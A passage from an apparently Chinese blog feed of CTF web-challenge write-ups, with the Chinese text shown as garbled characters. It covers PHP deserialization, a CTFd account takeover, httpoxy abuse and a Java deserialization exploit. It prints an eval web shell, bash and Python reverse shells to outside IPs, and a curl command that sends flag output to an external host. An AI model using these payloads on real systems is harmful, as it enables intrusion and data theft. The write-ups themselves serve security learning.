class="comment">//F5jryEGaDwBLk1WH2Kg8Gdl7CC6JDMKfNcaeMc+x9RtWhaRWiy8Pu8EosOrgWG97</span></span><br><span class="line">$uid = openssl_decrypt(<span class="string">'F5jryEGaDwBLk1WH2Kg8Gdl7CC6JDMKfNcaeMc+x9RtWhaRWiy8Pu8EosOrgWG97'</span>, <span class="string">'des-cbc'</span>, <span class="string">"77889691"</span>, <span class="number">0</span>, <span class="string">'O:4:"Use'</span>);</span><br><span class="line"><span class="keyword">echo</span> $uid;</span><br><span class="line">$IV=<span class="string">"85196940"</span>;</span><br><span class="line">$username=<span class="string">"admin"</span>;</span><br><span class="line">$o = <span class="keyword">new</span> User($username);</span><br><span class="line"><span class="keyword">echo</span> $o-&gt;show();</span><br><span class="line">$ser_user =serialize($o);</span><br><span class="line"></span><br><span class="line">$cipher = openssl_encrypt($ser_user, <span class="string">"des-cbc"</span>, <span class="string">"77889691"</span>, <span class="number">0</span>, $IV);</span><br><span class="line"><span class="keyword">echo</span> $cipher;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> base64_encode($cipher);</span><br></pre></td></tr></table></figure>

<p>ç„¶åæˆ‘ä»¬ä¼ªé€ æˆadminï¼Œå¤ç°åˆ°è¿™çš„æ—¶å€™ç¯å¢ƒå·²ç»å…³äº†ï¼Œçœ‹wpä¸Šé¢hind.phpçš„å†…å®¹æ˜¯,</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">I left a shell in <span class="number">10.10</span><span class="number">.1</span><span class="number">.12</span>/index.php</span><br><span class="line"><span class="keyword">try</span> to get it!</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'cc'</span>]))&#123;</span><br><span class="line">        $cc = $_GET[<span class="string">'cc'</span>];</span><br><span class="line">        <span class="keyword">eval</span>(substr($cc, <span class="number">0</span>, <span class="number">6</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>ç„¶åè¦æ‰“å†…ç½‘ï¼Œè¿™é‡Œå¯ä»¥é€šè¿‡soapclientååºåˆ—åŒ–ssrf,</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?cc&#x3D;&#96;$cc&#96;;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;xxxxx&#x2F;8888 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<p>å°±å¯ä»¥åå¼¹shelläº†,åé¢å°±æ²¡åšäº†ã€‚</p>
]]></content>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>V&amp;Næ‹›æ–°èµ›webéƒ¨åˆ†é¢˜è§£</title>
    <url>/2020/02/29/V/</url>
    <content><![CDATA[<p>V&amp;Næ‹›æ–°èµ›éƒ¨åˆ†webé¢˜è§£</p>
<a id="more"></a>

<h2 id="HappyCTFd"><a href="#HappyCTFd" class="headerlink" title="HappyCTFd"></a>HappyCTFd</h2><p>è€ƒç‚¹ï¼šctfdæ¼æ´</p>
<p>å‚è€ƒé“¾æ¥<a href="https://www.colabug.com/2020/0204/6940556/" target="_blank" rel="noopener">https://www.colabug.com/2020/0204/6940556/</a>æ¼æ´çš„ç›¸å…³åˆ†æï¼Œä¸Šæ–‡å†™çš„å¾ˆè¯¦ç»†ï¼Œè¿™é‡Œå°±ä¸å†ä»‹ç»ã€‚</p>
<p>è§£é¢˜æ­¥éª¤ï¼š</p>
<ol>
<li>å…ˆæ³¨å†Œä¸€ä¸ªadminçš„è´¦å·ï¼Œé€šè¿‡åœ¨adminå‰é¢åŠ ç©ºæ ¼æ¥ç»•è¿‡é‡å¤é™åˆ¶ã€‚</li>
<li>ç”Ÿæˆå¿˜è®°å¯†ç çš„é“¾æ¥ã€‚</li>
<li>æ›´æ”¹è‡ªå·±ç”¨æˆ·åä¸ºéadmin.</li>
<li>ç‚¹å‡»æ›´æ”¹å¯†ç çš„é“¾æ¥ï¼Œæ”¹åç™»å½•</li>
</ol>
<p><img src="/2020/02/29/V/image-20200229183951772.png" alt="image-20200229183951772"></p>
<p>ä¸‹è½½ï¼Œåå°±å¾—åˆ°flag.</p>
<h2 id="CHECKIN"><a href="#CHECKIN" class="headerlink" title="CHECKIN"></a>CHECKIN</h2><p>è€ƒç‚¹ï¼špythonåå¼¹shell   procç›®å½•</p>
<p>è®¿é—®å°±å¯ä»¥å¾—åˆ°æºç ï¼Œå³é”®æºä»£ç çœ‹åˆ°çš„ä»£ç è‡ªåŠ¨æœ‰æ¢è¡Œ</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">flag_file = open(<span class="string">"flag.txt"</span>, <span class="string">"r"</span>)</span><br><span class="line"><span class="comment"># flag = flag_file.read()</span></span><br><span class="line"><span class="comment"># flag_file.close()</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># @app.route('/flag')</span></span><br><span class="line"><span class="comment"># def flag():</span></span><br><span class="line"><span class="comment">#     return flag</span></span><br><span class="line"><span class="comment">## want flag? naive!</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># You will never find the thing you want:) I think</span></span><br><span class="line"><span class="meta">@app.route('/shell')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shell</span><span class="params">()</span>:</span></span><br><span class="line">    os.system(<span class="string">"rm -f flag.txt"</span>)</span><br><span class="line">    exec_cmd = request.args.get(<span class="string">'c'</span>)</span><br><span class="line">    os.system(exec_cmd)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"1"</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">source</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> open(<span class="string">"app.py"</span>,<span class="string">"r"</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>)</span><br></pre></td></tr></table></figure>

<p>çœ‹åˆ°å¾ˆç®€å•çš„æºç ï¼Œæœ‰ä¸¤ä¸ªè·¯ç”±ï¼Œ</p>
<ul>
<li>/  ï¼šå¯ä»¥å¾—åˆ°app.pyæºç </li>
<li>/shell  : é€šè¿‡ä¼ å…¥cå˜é‡å¯ä»¥æ‰§è¡Œå‘½ä»¤ï¼Œä½†æ˜¯ä¼šåˆ é™¤flag.txtæ–‡ä»¶ã€‚</li>
</ul>
<p>å¼€å§‹æ—¶ï¼Œæƒ³ç€é€šè¿‡ç±»ä¼¼æ—¶é—´ç›²æ³¨çš„æ–¹æ³•å»åšé¢˜ï¼Œåæ¥ä¸€æƒ³pythonå¯ä»¥ç›´æ¥åå¼¹shell,</p>
<p>ç„¶åå¼€äº†ä¸ªlinux-labï¼Œåå¼¹shellã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c&#x3D;python3%20-c%20%27import%20socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22174.0.216.234%22,1234));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p&#x3D;subprocess.call([%22&#x2F;bin&#x2F;sh%22,%22-i%22]);%27</span><br></pre></td></tr></table></figure>

<p><img src="/2020/02/29/V/image-20200229184920698.png" alt="image-20200229184920698"></p>
<p>ä¹‹åå°±æ˜¯æ‰¾flagäº†ï¼Œè¿™é‡Œåˆå­¦åˆ°äº†linuxä¸­/procç›®å½•å†…å®¹ã€‚æ›´è¯¦ç»†çš„å¯ä»¥<a href="https://blog.spoock.com/2019/10/08/proc/" target="_blank" rel="noopener">å‚è€ƒ</a>è¿™ç¯‡æ–‡ç« ï¼Œæ€»ç»“çš„å¾ˆè¯¦ç»†ã€‚</p>
<p><img src="/2020/02/29/V/image-20200229185248748.png" alt="image-20200229185248748"></p>
<p>ç”±äºpså‘½ä»¤ä¸å¯ç”¨ï¼Œè¿™é‡Œæˆ‘ä»¬å°±å»ç¿»ä¸€ä¸‹æ–‡ä»¶å¤¹</p>
<p><img src="/2020/02/29/V/image-20200229185546941.png" alt></p>
<p>æœ€ååœ¨/proc/10/fdæ–‡ä»¶é‡Œçœ‹è§äº†flag</p>
<h2 id="TimeTravel"><a href="#TimeTravel" class="headerlink" title="TimeTravel"></a>TimeTravel</h2><p>è¿™é¢˜ä¹Ÿç»™äº†æºç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">require</span> <span class="keyword">__DIR__</span> . <span class="string">'/vendor/autoload.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">GuzzleHttp</span>\<span class="title">Client</span>;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'flag'</span>])) &#123;</span><br><span class="line">    $client = <span class="keyword">new</span> Client();</span><br><span class="line">    $response = $client-&gt;get(<span class="string">'http://127.0.0.1:5000/api/eligible'</span>);</span><br><span class="line">    $content = $response-&gt;getBody();</span><br><span class="line">    $data = json_decode($content, <span class="keyword">TRUE</span>);</span><br><span class="line">    <span class="keyword">if</span>($data[<span class="string">'success'</span>] === <span class="keyword">true</span>) &#123;</span><br><span class="line">      <span class="keyword">echo</span> system(<span class="string">'/readflag'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>])) &#123;</span><br><span class="line">    highlight_file($_GET[<span class="string">'file'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'phpinfo'</span>])) &#123;</span><br><span class="line">    phpinfo();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>é˜Ÿå‹ç›´æ¥å‘äº†ä¸€ä¸ª<strong>cve-2016-5385</strong>ï¼Œç„¶åå»ç½‘ä¸ŠæŸ¥ä¸€æŸ¥ï¼Œçœ‹åˆ°<a href="https://github.com/vulhub/vulhub/blob/master/cgi/httpoxy/www/index.php" target="_blank" rel="noopener">vulhubé‡Œé¢å°±æœ‰</a>çœ‹ä¸€ä¸‹é‡Œé‡Œé¢çš„æºç ï¼Œ</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span> <span class="keyword">__DIR__</span> . <span class="string">'/vendor/autoload.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">GuzzleHttp</span>\<span class="title">Client</span>;</span><br><span class="line"></span><br><span class="line">header(<span class="string">'Content-Type: application/json; charset=utf-8'</span>);</span><br><span class="line"></span><br><span class="line">$client = <span class="keyword">new</span> Client([</span><br><span class="line">    <span class="comment">// Base URI is used with relative requests</span></span><br><span class="line">    <span class="string">'base_uri'</span> =&gt; <span class="string">'http://httpbin.org'</span>,</span><br><span class="line">    <span class="comment">// You can set any number of default request options.</span></span><br><span class="line">    <span class="string">'timeout'</span>  =&gt; <span class="number">2.0</span>,</span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line">$response = $client-&gt;get(<span class="string">'http://httpbin.org/get'</span>);</span><br><span class="line"></span><br><span class="line">$body = $response-&gt;getBody();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $body;</span><br></pre></td></tr></table></figure>

<p>æºç å·®ä¸å¤š</p>
<blockquote>
<p>ç®€å•æ¥è¯´ï¼Œæ ¹æ®RFC 3875è§„å®šï¼Œcgiï¼ˆfastcgiï¼‰è¦å°†ç”¨æˆ·ä¼ å…¥çš„æ‰€æœ‰HTTPå¤´éƒ½åŠ ä¸Š<code>HTTP_</code>å‰ç¼€æ”¾å…¥ç¯å¢ƒå˜é‡ä¸­ï¼Œè€Œæ°å¥½å¤§å¤šæ•°ç±»åº“çº¦å®šä¿—æˆä¼šæå–ç¯å¢ƒå˜é‡ä¸­çš„<code>HTTP_PROXY</code>å€¼ä½œä¸ºHTTPä»£ç†åœ°å€ã€‚äºæ˜¯ï¼Œæ¶æ„ç”¨æˆ·é€šè¿‡æäº¤<code>Proxy: http://evil.com</code>è¿™æ ·çš„HTTPå¤´ï¼Œå°†ä½¿ç”¨ç¼ºé™·ç±»åº“çš„ç½‘ç«™çš„ä»£ç†è®¾ç½®ä¸º<code>http://evil.com</code>ï¼Œè¿›è€Œçªƒå–æ•°æ®åŒ…ä¸­å¯èƒ½å­˜åœ¨çš„æ•æ„Ÿä¿¡æ¯ã€‚</p>
</blockquote>
<p>è¿™ç§æ¼æ´çš„åˆ©ç”¨ï¼Œé€šè¿‡åœ¨httpè¯·æ±‚å¤´ä¸­æ·»åŠ Proxyå¤´ï¼Œå°±å¯ä»¥æŠŠè¯·æ±‚ä»£ç†åˆ°æ¶æ„çš„ä»£ç†æœåŠ¡å™¨ï¼Œè¿›è€Œå¯ä»¥çªƒå–æ•°æ®æŠ¥çš„æ•æ„Ÿä¿¡æ¯ï¼Œä¹Ÿå¯ä»¥ç¯¡æ”¹è¯·æ±‚æŠ¥çš„å“åº”ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'flag'</span>])) &#123;</span><br><span class="line">    $client = <span class="keyword">new</span> Client();</span><br><span class="line">    $response = $client-&gt;get(<span class="string">'http://127.0.0.1:5000/api/eligible'</span>);</span><br><span class="line">    $content = $response-&gt;getBody();</span><br><span class="line">    $data = json_decode($content, <span class="keyword">TRUE</span>);</span><br><span class="line">    <span class="keyword">if</span>($data[<span class="string">'success'</span>] === <span class="keyword">true</span>) &#123;</span><br><span class="line">      <span class="keyword">echo</span> system(<span class="string">'/readflag'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä»ä¸Šé¢çš„å…³é”®ä»£ç å¯ä»¥çœ‹åˆ°ï¼Œè¦å¾—åˆ°flag,éœ€è¦æ»¡è¶³<code>$data[&#39;success&#39;] === true</code>ï¼Œå¦‚æœè¯·æ±‚ä»£ç†åˆ°æˆ‘ä»¬çš„æœåŠ¡å™¨ï¼Œç„¶åå›å‘<a href="http://127.0.0.1:5000/api/eligibleå‘é€è¯·æ±‚ï¼Œå¦‚æœå‘é€çš„è¯·æ±‚ï¼Œjsonè§£ç åï¼Œ$data[&#39;success&#39;]ä¸ºtrue,å°±ä¼šå¾—åˆ°flagã€‚" target="_blank" rel="noopener">http://127.0.0.1:5000/api/eligibleå‘é€è¯·æ±‚ï¼Œå¦‚æœå‘é€çš„è¯·æ±‚ï¼Œjsonè§£ç åï¼Œ$data[&#39;success&#39;]ä¸ºtrue,å°±ä¼šå¾—åˆ°flagã€‚</a></p>
<p>è§£é¢˜æ­¥éª¤</p>
<ul>
<li>ç”¨æˆ‘ä»¬çš„apacheæœåŠ¡å™¨ä½œä¸ºä»£ç†æœåŠ¡å™¨</li>
</ul>
<p><img src="/2020/02/29/V/image-20200229192230132.png" alt="image-20200229192230132"></p>
<ul>
<li><p>ç„¶åç”¨phpåœ¨æœ¬åœ°èµ·ä¸€ä¸ªæœåŠ¡å™¨ï¼Œç›‘å¬5000ç«¯å£ï¼Œåœ¨api/eligibleç›®å½•ä¸‹æ–°å»ºindex.php,è„šæœ¬è¾“å‡ºï¼Œè§£ç å$data[â€˜successâ€™]ä¸ºtrueã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=<span class="keyword">array</span>(<span class="string">"success"</span>=&gt;<span class="keyword">true</span>);</span><br><span class="line"><span class="keyword">echo</span> json_encode($a);</span><br></pre></td></tr></table></figure>

<p>æœ¬åœ°åœ¨ç”¨phpå¯ä¸€ä¸ªphpçš„å†…ç½®æœåŠ¡å™¨ï¼Œç«¯å£ä¸º5000</p>
<p><img src="/2020/02/29/V/image-20200229193926226.png" alt="image-20200229193926226"></p>
</li>
<li><p>ç„¶åburpå†å‘åŒ…ï¼Œè§¦å‘æ¡ä»¶ï¼Œå¾—åˆ°flagã€‚</p>
</li>
</ul>
<p><img src="/2020/02/29/V/image-20200229194145302.png" alt="image-20200229194145302"></p>
<h2 id="EasySpringMVC"><a href="#EasySpringMVC" class="headerlink" title="EasySpringMVC"></a>EasySpringMVC</h2><p>è€ƒç‚¹ï¼šjavaååºåˆ—åŒ–</p>
<p>é¢˜ç›®ç»™äº†æºç æ˜¯waråŒ…ï¼Œç”¨tomcatéƒ¨ç½²åï¼Œ</p>
<p><img src="/2020/02/29/V/image-20200301110922154.png" alt="image-20200301110922154"></p>
<p>æµè§ˆä¸€ä¸‹åŠŸèƒ½ï¼Œå¯ä»¥ä¸Šä¼ ï¼Œä½†æ˜¯è¦webmanageæƒé™ï¼Œå¼€å§‹ä»¥ä¸ºè¦ä¿®æ”¹æƒé™ï¼Œä¸Šä¼ ä¸ªå›¾ç‰‡é©¬ ä»€ä¹ˆçš„ã€‚</p>
<p>ç„¶åå®¡è®¡æºç ï¼Œç”±äºä¹‹å‰æ²¡æœ‰åšè¿‡javaçš„é¢˜ï¼Œå¯¹javaçš„ç¨‹åºæ¡†æ¶ä¸æ˜¯å¾ˆäº†è§£ï¼Œä¸€è¾¹ç™¾åº¦ä¸€è¾¹ç†è§£ï¼Œ<img src="/2020/02/29/V/image-20200301111336301.png" alt></p>
<p>ç¨‹åºå¤§è‡´çš„æ¡†æ¶å°±æ˜¯è¿™æ ·ï¼ˆæœ¬äººçš„ç†è§£ï¼‰ï¼Œæœ‰æ§åˆ¶å™¨ï¼Œæœ‰jspæ–‡ä»¶ï¼Œlibæ–‡ä»¶å¤¹é‡Œé¢çš„éƒ½æ˜¯å¼•ç”¨çš„jaråŒ…ï¼Œçœ‹äº†é‡Œé¢çš„jaråŒ…ï¼Œæ²¡æœ‰ååºåˆ—åŒ–æ¼æ´çš„ç‰ˆæœ¬ã€‚è¿™é‡Œçš„ClientinfoFilterå°±æ˜¯ä¸€ä¸ªå…¨å±€è¿‡æ»¤å™¨ï¼Œåœ¨web.xmlæ–‡ä»¶ä¸­ï¼Œ</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>clientinfo<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>com.filters.ClentInfoFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>clientinfo<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>*<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>filter-class  å¿…éœ€å…ƒç´ ï¼Œå®ƒæŒ‡å®šè¿‡æ»¤å™¨å®ç°ç±»çš„å®Œå…¨é™å®šåã€‚</p>
<p>filter-name  è¿™ä¸ªå¿…éœ€çš„å…ƒç´ å¿…é¡»ä¸ç”¨filterå…ƒç´ å£°æ˜æ—¶ç»™äºˆè¿‡æ»¤å™¨çš„åç§°ç›¸åŒ¹é…ã€‚</p>
<p>servlet-name  æ­¤å…ƒç´ ç»™å‡ºä¸€ä¸ªåç§°ï¼Œæ­¤åç§°å¿…é¡»ä¸åˆ©ç”¨servletå…ƒç´ ç»™äºˆservletæˆ–JSPé¡µé¢çš„åç§°ç›¸åŒ¹é…ã€‚</p>
</blockquote>
<p><a href="http://www.51gjie.com/javaweb/868.html" target="_blank" rel="noopener">å‚è€ƒé“¾æ¥</a></p>
<p><img src="/2020/02/29/V/image-20200301112633247.png" alt="image-20200301112633247"></p>
<p>ç„¶åæˆ‘ä»¬ç»§ç»­çœ‹ClientinfoFilterä¸­çš„doFilteræ–¹æ³•ï¼Œ</p>
<p><img src="/2020/02/29/V/image-20200301112812260.png" alt="image-20200301112812260"></p>
<p>é¦–å…ˆå»å–cookie,å¦‚æœcookieä¸­æœ‰cinfo,existå°±ä¸ºtrue,ç„¶åè¿›å…¥åˆ¤æ–­ï¼Œå°†cookieä¸­çš„cinfoå€¼base64è§£ç ï¼Œç„¶åè°ƒç”¨Tools.parse()æ–¹æ³•ï¼Œç»§ç»­è·Ÿè¿›</p>
<p><img src="/2020/02/29/V/image-20200301113107762.png" alt="image-20200301113107762"></p>
<p>parseæ–¹æ³•å¯¹è¾“å…¥è¿›è¡Œäº†ååºåˆ—åŒ–ï¼Œå¯ä»¥å‘ç°Toolsç±»é‡å†™äº†readObjectæ–¹æ³•ï¼Œ<a href="http://www.lmxspace.com/2019/11/20/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%87%E7%A8%8B%E6%B7%B1%E7%A9%B6/" target="_blank" rel="noopener">é‚£ä¹ˆå‚è€ƒå¤§ä½¬çš„æ–‡ç« </a>ï¼Œé‡å†™ååºåˆ—åŒ–æ–¹æ³•ä¼šæœ‰é£é™©ï¼Œè€Œä¸”è¿™é‡Œé‡å†™çš„æ–¹æ³•è¿˜è°ƒç”¨äº†ProcessBuilder().start)(),è¿™ä¸ªæ–¹æ³•å¯ä»¥æ‰§è¡Œå‘½ä»¤ï¼Œåˆ°äº†è¿™é‡Œï¼Œæˆ‘ä»¬çš„æ€è·¯å°±å¾ˆæ¸…æ™°äº†ï¼Œé€šè¿‡æ„é€ cookie,è§¦å‘ååºåˆ—åŒ–ï¼Œè°ƒç”¨é‡å†™çš„readObjectæ–¹æ³•ï¼Œè¿›è€Œè°ƒç”¨ProcessBuilder.start()æ–¹æ³•ï¼Œæ‰§è¡Œå‘½ä»¤ã€‚</p>
<p>é¦–å…ˆï¼Œæˆ‘ä»¬åœ¨æœ¬åœ°å°è¯•ä¸€ä¸‹å¯ä¸å¯ä»¥ï¼Œ</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//exp.java</span></span><br><span class="line"><span class="keyword">package</span> com.tools;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">exp</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Tools test = <span class="keyword">new</span> Tools();</span><br><span class="line">            <span class="keyword">byte</span>[] bytes = Tools.create(test);</span><br><span class="line">            Base64.Encoder  encoder = Base64.getEncoder();</span><br><span class="line">            System.out.println(encoder.encodeToString(bytes));</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(Exception e)</span><br><span class="line">        &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä»ä¸Šå›¾æˆ‘ä»¬å¯ä»¥çœ‹åˆ°create()æ–¹æ³•ä¸­è°ƒç”¨äº†writeObjectï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é‡å†™writeObjectï¼ˆï¼‰å‡½æ•°ï¼Œæ¥è¿›ä¸€æ­¥åˆ©ç”¨</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Tools.java</span></span><br><span class="line"><span class="keyword">package</span> com.tools;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Tools</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">1L</span>;</span><br><span class="line">    <span class="keyword">private</span> String testCall;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Tools</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">parse</span><span class="params">(<span class="keyword">byte</span>[] bytes)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> ByteArrayInputStream(bytes));</span><br><span class="line">        <span class="keyword">return</span> ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] create(Object obj) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ByteArrayOutputStream bos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream outputStream = <span class="keyword">new</span> ObjectOutputStream(bos);</span><br><span class="line">        outputStream.writeObject(obj);</span><br><span class="line">        <span class="keyword">return</span> bos.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        Object obj = in.readObject();</span><br><span class="line">        (<span class="keyword">new</span> ProcessBuilder((String[])((String[])obj))).start();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeObject</span><span class="params">(ObjectOutputStream out)</span><span class="keyword">throws</span> IOException</span>&#123;</span><br><span class="line">        <span class="comment">//String[] cmd=&#123;"/bin/sh", "-c","curl -d `/readflag` 174.0.219.93:8888"&#125;;</span></span><br><span class="line">        String[] cmd=&#123;<span class="string">"calc"</span>&#125;;</span><br><span class="line">        out.writeObject(cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/02/29/V/image-20200301120719913.png" alt="image-20200301120719913"></p>
<p>å°†è¿è¡Œåçš„base64ï¼Œæ”¾å…¥test.javaä¸­æµ‹è¯•ä¸€ä¸‹</p>
<p><img src="/2020/02/29/V/image-20200301120834520.png" alt="image-20200301120834520"></p>
<p>ä¹‹åå°±å¯ä»¥æ‰§è¡Œå‘½ä»¤äº†ï¼Œ<a href="http://www.lmxspace.com/2019/10/08/Java%E4%B8%8B%E5%A5%87%E6%80%AA%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" target="_blank" rel="noopener">è¿™é‡Œå‚è€ƒä¸€ä¸‹å¸ˆå‚…çš„æ–‡ç« </a>ï¼Œé‡Œé¢è®²è§£äº†Runtime.getRuntime().exec(cmd)å’ŒProcessBuilder pb=new ProcessBuilder(cmd)çš„åŒºåˆ«å’Œç”¨æ³•ï¼Œ</p>
<p>ç„¶åæˆ‘ä»¬æŠŠå‘½ä»¤æ”¹ä¸‹</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeObject</span><span class="params">(ObjectOutputStream out)</span><span class="keyword">throws</span> IOException</span>&#123;</span><br><span class="line">      String[] cmd=&#123;<span class="string">"/bin/sh"</span>, <span class="string">"-c"</span>,<span class="string">"curl -d `/readflag` 174.0.219.93:8888"</span>&#125;;</span><br><span class="line">      <span class="comment">//String[] cmd=&#123;"calc"&#125;;</span></span><br><span class="line">      out.writeObject(cmd);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>ç”Ÿæˆçš„æ›¿æ¢ä¸‹cookie,å°±å¾—åˆ°äº† flag</p>
<p><img src="/2020/02/29/V/image-20200301122930606.png" alt="image-20200301122930606"></p>
]]></content>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>JavascriptåŸå‹é“¾æ±¡æŸ“</title>
    <url>/2020/02/25/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</url>
